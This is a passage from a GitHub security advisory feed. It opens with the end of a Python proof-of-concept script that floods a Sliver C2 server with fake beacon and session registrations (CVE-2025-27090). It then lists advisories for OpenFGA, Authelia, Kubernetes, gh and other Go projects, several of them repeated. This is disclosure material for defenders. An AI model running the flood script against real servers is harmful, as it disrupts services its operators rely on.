  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

def register_beacon(ip,port):
  print('[yellow]\[i][/yellow] Sending beacon registration.')
  reg = sliver.BeaconRegister()
  reg.ID = str(uuid.uuid4())
  junk_sz = 50
  reg.Interval = random.randint(0,10*junk_sz)
  reg.Jitter = random.randint(0,10*junk_sz)
  reg.NextCheckin = random.randint(0,10*junk_sz)
  json_format.Parse(json.dumps(junk_register(junk_sz)),reg.Register)
  envelope = sliver.Envelope()
  envelope.Type = msgs.index('BeaconRegister')
  envelope.Data = reg.SerializeToString()
  send_envelope(envelope,ip,port)

description = '''
Flood a Sliver C2 server with beacons and sessions. Requires an mtls certificate.
'''

if __name__ == '__main__':
  register_session(sys.argv[1], int(sys.argv[2]))
</code></pre>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w">https://github.com/BishopFox/sliver/security/advisories/GHSA-fh4v-v779-4g2w</a></li>
<li><a href="https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f">https://github.com/BishopFox/sliver/commit/0f340a25cf3d496ed870dae7da39eab4427bc16f</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-27090">https://nvd.nist.gov/vuln/detail/CVE-2025-27090</a></li>
<li><a href="https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1">https://github.com/BishopFox/sliver/commit/10e245326070c6a5884a02e0790bb7e2baefb3a1</a></li>
<li><a href="https://github.com/advisories/GHSA-fh4v-v779-4g2w">https://github.com/advisories/GHSA-fh4v-v779-4g2w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fh4v-v779-4g2w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-19T21:11:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/openfga/openfga] OpenFGA Authorization Bypass]]></title>
        <id>https://github.com/advisories/GHSA-g4v5-6f5p-m38j</id>
        <link href="https://github.com/advisories/GHSA-g4v5-6f5p-m38j"/>
        <updated>2025-02-19T22:39:16.000Z</updated>
        <content type="html"><![CDATA[<p>Overview
OpenFGA v1.8.4 or previous (Helm chart &lt; openfga-0.2.22, docker &lt; v.1.8.5) are vulnerable to authorization bypass when certain Check and ListObject calls are executed.</p>
<p>Am I Affected?
If you are using OpenFGA v1.8.4 or previous, specifically under the following conditions, you are affected by this authorization bypass vulnerability:</p>
<ul>
<li>Calling Check API or ListObjects with a model that has a relation <a href="https://openfga.dev/docs/concepts#what-is-a-directly-related-user-type">directly assignable</a> to both <a href="https://openfga.dev/docs/concepts#what-is-type-bound-public-access">public access</a> AND <a href="https://openfga.dev/docs/concepts#what-is-a-user">userset</a> with the <a href="https://openfga.dev/docs/concepts#what-is-a-type">same type</a>, and</li>
<li>A type bound public access tuple is assigned to an object, and</li>
<li>userset tuple is not assigned to the same object, and</li>
<li>Check request's user field is a userset that has the same type as the type bound public access tuple's user type</li>
</ul>
<p>Fix
Upgrade to v1.8.5. This upgrade is backwards compatible.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/openfga/openfga/security/advisories/GHSA-g4v5-6f5p-m38j">https://github.com/openfga/openfga/security/advisories/GHSA-g4v5-6f5p-m38j</a></li>
<li><a href="https://github.com/openfga/openfga/commit/0aee4f47e0c642de78831ceb27bb62b116f49588">https://github.com/openfga/openfga/commit/0aee4f47e0c642de78831ceb27bb62b116f49588</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25196">https://nvd.nist.gov/vuln/detail/CVE-2025-25196</a></li>
<li><a href="https://github.com/advisories/GHSA-g4v5-6f5p-m38j">https://github.com/advisories/GHSA-g4v5-6f5p-m38j</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-g4v5-6f5p-m38j</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-19T20:25:22.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/authelia/authelia/v4] Authelia applies regulation separately to Username-based logins to Email-based logins]]></title>
        <id>https://github.com/advisories/GHSA-m5mf-3963-4x26</id>
        <link href="https://github.com/advisories/GHSA-m5mf-3963-4x26"/>
        <updated>2025-02-19T20:00:07.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>If users are allowed to sign in via both username and email the regulation system treats these as separate login events. This leads to the regulation limitations being effectively doubled assuming an attacker using brute-force to find a user password. It's important to note that due to the effective operation of regulation where no user-facing sign of their regulation ban being visible either via timing or via API responses, it's effectively impossible to determine if a failure occurs due to a bad username password combination, or a effective ban blocking the attempt which heavily mitigates any form of brute-force.</p>
<h3 id="details">Details</h3>
<p>This occurs because the records and counting process for this system uses the method utilized for sign in rather than the effective username attribute.</p>
<h3 id="impact">Impact</h3>
<p>This has a minimal impact on account security, this impact is increased naturally in scenarios when there is no two-factor authentication required and weak passwords are used. This makes it a bit easier to brute-force a password.</p>
<h3 id="workarounds">Workarounds</h3>
<ol>
<li>Do not heavily modify the default settings in a way that ends up with shorter or less frequent regulation bans. The default settings effectively mitigate any potential for this issue to be exploited.</li>
<li>Disable the ability for users to login via an email address.</li>
</ol>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26">https://github.com/authelia/authelia/security/advisories/GHSA-m5mf-3963-4x26</a></li>
<li><a href="https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c">https://github.com/authelia/authelia/commit/d4a54189aa6563912f9427b96dcb01eacafa785c</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-24806">https://nvd.nist.gov/vuln/detail/CVE-2025-24806</a></li>
<li><a href="https://github.com/advisories/GHSA-m5mf-3963-4x26">https://github.com/advisories/GHSA-m5mf-3963-4x26</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-m5mf-3963-4x26</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-19T17:47:47.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cli/cli/v2] `gh attestation verify` returns incorrect exit code during verification if no attestations are present]]></title>
        <id>https://github.com/advisories/GHSA-fgw4-v983-mgp8</id>
        <link href="https://github.com/advisories/GHSA-fgw4-v983-mgp8"/>
        <updated>2025-02-17T07:28:55.000Z</updated>
        <content type="html"><![CDATA[<h3 id="summary">Summary</h3>
<p>A bug in GitHub's Artifact Attestation CLI tool, <code>gh attestation verify</code>, may return an incorrect zero exit status when no matching attestations are found for the specified <code>--predicate-type &lt;value&gt;</code> or the default <code>https://slsa.dev/provenance/v1</code> if not specified. This issue only arises if an artifact has an attestation with a predicate type different from the one provided in the command. As a result, users relying solely on these exit codes may mistakenly believe the attestation has been verified, despite the absence of an attestation with the specified predicate type and the tool printing a verification failure.</p>
<p>Users are advised to update <code>gh</code> to version <code>v2.67.0</code> as soon as possible.</p>
<p>Initial report: <a href="https://github.com/cli/cli/issues/10418">https://github.com/cli/cli/issues/10418</a>
Fix: <a href="https://github.com/cli/cli/pull/10421">https://github.com/cli/cli/pull/10421</a></p>
<h3 id="details">Details</h3>
<p>The gh attestation verify command fetches, loads, and attempts to verify attestations associated with a given artifact for a specified predicate type. If an attestation is found, but the predicate type does not match the one specified in the <code>gh attestation verify</code> command, the verification fails, but the program exits early.</p>
<p>Due to a re-used uninitialized error variable, when no matching attestations are found, the relevant function returns <code>nil</code> instead of an error, causing the program to exit with a status code of <code>0</code>, which incorrectly suggests successful verification.</p>
<h3 id="poc">PoC</h3>
<p>Run <code>gh attestation verify</code> with local attestations using the <code>--bundle</code> flag and specify a predicate type with <code>--predicate-type</code> that you know will not match any of the attestations the command will attempt to verify. Confirm that the command exits with a zero status code.</p>
<h3 id="impact">Impact</h3>
<p>Users who rely exclusively on the exit status code of <code>gh attestation verify</code> may incorrectly verify an attestation when the attestation's predicate type does not match the specified predicate type in the command.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8">https://github.com/cli/cli/security/advisories/GHSA-fgw4-v983-mgp8</a></li>
<li><a href="https://github.com/cli/cli/issues/10418">https://github.com/cli/cli/issues/10418</a></li>
<li><a href="https://github.com/cli/cli/pull/10421">https://github.com/cli/cli/pull/10421</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25204">https://nvd.nist.gov/vuln/detail/CVE-2025-25204</a></li>
<li><a href="https://github.com/advisories/GHSA-fgw4-v983-mgp8">https://github.com/advisories/GHSA-fgw4-v983-mgp8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-fgw4-v983-mgp8</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-14T17:19:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/mayswind/ezbookkeeping] Missing rate limit in MaysWind ezBookkeeping]]></title>
        <id>https://github.com/advisories/GHSA-772m-773g-qmhc</id>
        <link href="https://github.com/advisories/GHSA-772m-773g-qmhc"/>
        <updated>2025-02-13T22:43:45.000Z</updated>
        <content type="html"><![CDATA[<p>An issue in MaysWind ezBookkeeping 0.7.0 allows a remote attacker to escalate privileges via the lack of rate limiting.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-57603">https://nvd.nist.gov/vuln/detail/CVE-2024-57603</a></li>
<li><a href="https://github.com/mayswind/ezbookkeeping/issues/33">https://github.com/mayswind/ezbookkeeping/issues/33</a></li>
<li><a href="https://hkohi.ca/vulnerability/1">https://hkohi.ca/vulnerability/1</a></li>
<li><a href="https://github.com/advisories/GHSA-772m-773g-qmhc">https://github.com/advisories/GHSA-772m-773g-qmhc</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-772m-773g-qmhc</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T00:33:07.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[k8s.io/kubernetes] Node Denial of Service via kubelet Checkpoint API]]></title>
        <id>https://github.com/advisories/GHSA-jgfp-53c3-624w</id>
        <link href="https://github.com/advisories/GHSA-jgfp-53c3-624w"/>
        <updated>2025-02-13T20:55:33.000Z</updated>
        <content type="html"><![CDATA[<p>A security issue was discovered in Kubernetes where a large number of container checkpoint requests made to the unauthenticated kubelet read-only HTTP endpoint may cause a Node Denial of Service by filling the Node's disk.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-0426">https://nvd.nist.gov/vuln/detail/CVE-2025-0426</a></li>
<li><a href="https://github.com/kubernetes/kubernetes/issues/130016">https://github.com/kubernetes/kubernetes/issues/130016</a></li>
<li><a href="https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8">https://groups.google.com/g/kubernetes-security-announce/c/KiODfu8i6w8</a></li>
<li><a href="http://www.openwall.com/lists/oss-security/2025/02/13/1">http://www.openwall.com/lists/oss-security/2025/02/13/1</a></li>
<li><a href="https://github.com/advisories/GHSA-jgfp-53c3-624w">https://github.com/advisories/GHSA-jgfp-53c3-624w</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jgfp-53c3-624w</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-13T18:32:33.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/redhat-developer/gitops-operator] OpenShift GitOps Operator Namespace Isolation Break]]></title>
        <id>https://github.com/advisories/GHSA-58fx-7v9q-3g56</id>
        <link href="https://github.com/advisories/GHSA-58fx-7v9q-3g56"/>
        <updated>2025-02-13T15:08:58.000Z</updated>
        <content type="html"><![CDATA[<p>A flaw was found in openshift-gitops-operator-container. The openshift.io/cluster-monitoring label is applied to all namespaces that deploy an ArgoCD CR instance, allowing the namespace to create a rogue PrometheusRule. This issue can have adverse effects on the platform monitoring stack, as the rule is rolled out cluster-wide when the label is applied.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-13484">https://nvd.nist.gov/vuln/detail/CVE-2024-13484</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-13484">https://access.redhat.com/security/cve/CVE-2024-13484</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2269376">https://bugzilla.redhat.com/show_bug.cgi?id=2269376</a></li>
<li><a href="https://github.com/advisories/GHSA-58fx-7v9q-3g56">https://github.com/advisories/GHSA-58fx-7v9q-3g56</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-58fx-7v9q-3g56</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-01-28T18:31:28.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v8] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain]]></title>
        <id>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</id>
        <link href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f"/>
        <updated>2025-02-12T22:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>
<p>We recommend upgrading as soon as possible.</p>
<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>
<h3 id="patches">Patches</h3>
<p>Versions <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">7.2.1</a> and <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">8.1.1</a> are patched.</p>
<h3 id="workarounds">Workarounds</h3>
<p>N/A</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T22:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/cosmos/ibc-apps/middleware/packet-forward-middleware/v7] Potential Denial-of-Service condition leading to temporary disability in IBC transfers to the native chain]]></title>
        <id>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</id>
        <link href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f"/>
        <updated>2025-02-12T22:01:25.000Z</updated>
        <content type="html"><![CDATA[<h3 id="impact">Impact</h3>
<p>Chains using affected versions of Packet Forward Middleware in their IBC Transfer stack are vulnerable to an attack in which there is a potential denial of service. This affects IBC transfers for any asset which is being transferred between another chain and its native chain.</p>
<p>We recommend upgrading as soon as possible.</p>
<p><strong>THIS IS A STATE BREAKING CHANGE</strong></p>
<h3 id="patches">Patches</h3>
<p>Versions <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">7.2.1</a> and <a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">8.1.1</a> are patched.</p>
<h3 id="workarounds">Workarounds</h3>
<p>N/A</p>
<h3 id="references">References</h3>
<p>N/A</p>
<h3 id="references-1">References</h3>
<ul>
<li><a href="https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/cosmos/ibc-apps/security/advisories/GHSA-6fgm-x6ff-w78f</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv7.2.1</a></li>
<li><a href="https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1">https://github.com/cosmos/ibc-apps/releases/tag/middleware%2Fpacket-forward-middleware%2Fv8.1.1</a></li>
<li><a href="https://github.com/advisories/GHSA-6fgm-x6ff-w78f">https://github.com/advisories/GHSA-6fgm-x6ff-w78f</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-6fgm-x6ff-w78f</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2025-02-12T22:01:24.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[go.temporal.io/api] Unencrypted transmission in Temporal api-go library]]></title>
        <id>https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</id>
        <link href="https://github.com/advisories/GHSA-q9w6-cwj4-gf4p"/>
        <updated>2025-02-12T19:37:53.000Z</updated>
        <content type="html"><![CDATA[<p>The Temporal api-go library prior to version 1.44.1 did not send <code>update response</code> information to Data Converter when the proxy package within the api-go module was used in a gRPC proxy prior to transmission. This resulted in&nbsp;information contained within the <code>update response</code> field not having Data Converter transformations (e.g. encryption) applied. This is an issue only when using the UpdateWorkflowExecution APIs (released on 13th January 2025)  with a proxy leveraging the api-go library before version 1.44.1.</p>
<p>Other data fields were correctly sent to Data Converter. This issue does not impact the Data Converter server. Data was encrypted in transit. Temporal Cloud services are not impacted.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-1243">https://nvd.nist.gov/vuln/detail/CVE-2025-1243</a></li>
<li><a href="https://github.com/temporalio/api-go/releases/tag/v1.44.1">https://github.com/temporalio/api-go/releases/tag/v1.44.1</a></li>
<li><a href="https://temporal.io/blog/announcing-a-new-operation-workflow-update">https://temporal.io/blog/announcing-a-new-operation-workflow-update</a></li>
<li><a href="https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b">https://github.com/temporalio/api-go/commit/dad8b169ada911d3778e070484d1ae78a58bd22b</a></li>
<li><a href="https://github.com/advisories/GHSA-q9w6-cwj4-gf4p">https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-q9w6-cwj4-gf4p</uri>
        </author>
        <category label="severity" term="LOW"/>
        <published>2025-02-12T03:31:14.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[github.com/microsoft/go-crypto-winnative] go-crypto-winnative BCryptGenerateSymmetricKey memory leak]]></title>
        <id>https://github.com/advisories/GHSA-29c6-3hcj-89cf</id>
        <link href="https://github.com/advisories/GHSA-29c6-3hcj-89cf"/>
        <updated>2025-02-12T19:21:02.000Z</updated>
        <content type="html"><![CDATA[<p>Calls to <code>cng.TLS1PRF</code> don't release the key handle, producing a small memory leak every time.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf">https://github.com/microsoft/go-crypto-winnative/security/advisories/GHSA-29c6-3hcj-89cf</a></li>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2025-25199">https://nvd.nist.gov/vuln/detail/CVE-2025-25199</a></li>
<li><a href="https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41">https://github.com/microsoft/go-crypto-winnative/commit/f49c8e1379ea4b147d5bff1b3be5b0ff45792e41</a></li>
<li><a href="https://github.com/advisories/GHSA-29c6-3hcj-89cf">https://github.com/advisories/GHSA-29c6-3hcj-89cf</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-29c6-3hcj-89cf</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2025-02-12T19:20:24.000Z</published>
    </entry>
</feed>